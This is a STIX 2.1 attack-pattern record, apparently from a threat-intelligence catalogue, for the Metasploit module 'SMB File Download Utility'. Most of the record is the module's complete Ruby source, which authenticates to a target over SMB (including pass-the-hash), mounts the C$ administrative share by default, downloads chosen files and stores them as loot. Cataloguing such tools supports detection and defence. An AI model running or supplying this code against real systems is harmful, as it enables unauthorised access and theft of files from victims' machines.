{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--75871697-79c4-4959-8295-1b30e06346b0",
    "created": "2024-08-14T16:24:20.883223Z",
    "modified": "2024-08-14T16:24:20.883227Z",
    "name": "SMB File Download Utility",
    "description": "Q This module downloads a file from a target share and path. The usual reason to use this module is to work around limitations in an existing SMB client that may not be able to take advantage of pass-the-hash style authentication. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/smb/download_file.rb",
            "external_id": "download_file.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  # Exploit mixins should be called first\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Exploit::Remote::SMB::Client::Authenticated\n  include Msf::Exploit::Remote::SMB::Client::RemotePaths\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'SMB File Download Utility',\n      'Description' => %Q{\n        This module downloads a file from a target share and path. The usual reason\n      to use this module is to work around limitations in an existing SMB client that may not\n      be able to take advantage of pass-the-hash style authentication.\n      },\n      'Author'      =>\n        [\n          'mubix' # copied from hdm upload_file module\n        ],\n      'License'     => MSF_LICENSE\n    )\n\n    register_options([\n      OptString.new('SMBSHARE', [true, 'The name of a share on the RHOST', 'C$'])\n    ])\n  end\n\n  def smb_download\n    vprint_status(\"Connecting...\")\n    connect\n    smb_login()\n\n    vprint_status(\"#{peer}: Mounting the remote share \\\\\\\\#{rhost}\\\\#{datastore['SMBSHARE']}'...\")\n    self.simple.connect(\"\\\\\\\\#{rhost}\\\\#{datastore['SMBSHARE']}\")\n\n    remote_paths.each do |remote_path|\n      begin\n        vprint_status(\"Trying to download #{remote_path}...\")\n\n        data = ''\n        fd = simple.open(\"#{remote_path}\", 'o')\n        begin\n          data = fd.read\n        ensure\n          fd.close\n        end\n\n        fname = remote_path.split(\"\\\\\")[-1]\n        path = store_loot(\"smb.shares.file\", \"application/octet-stream\", rhost, data, fname)\n        print_good(\"#{remote_path} saved as: #{path}\")\n      rescue Rex::Proto::SMB::Exceptions::ErrorCode => e\n        elog(\"Unable to download #{remote_path}:\", error: e)\n        print_error(\"Unable to download #{remote_path}: #{e.message}\")\n      end\n    end\n  end\n\n  def run_host(ip)\n    validate_rpaths!\n\n    begin\n      smb_download\n    rescue Rex::Proto::SMB::Exceptions::LoginError => e\n      elog(\"Unable to login: #{e.message}\", error: e)\n      print_error(\"Unable to login: #{e.message}\")\n    end\n  end\nend\n"
}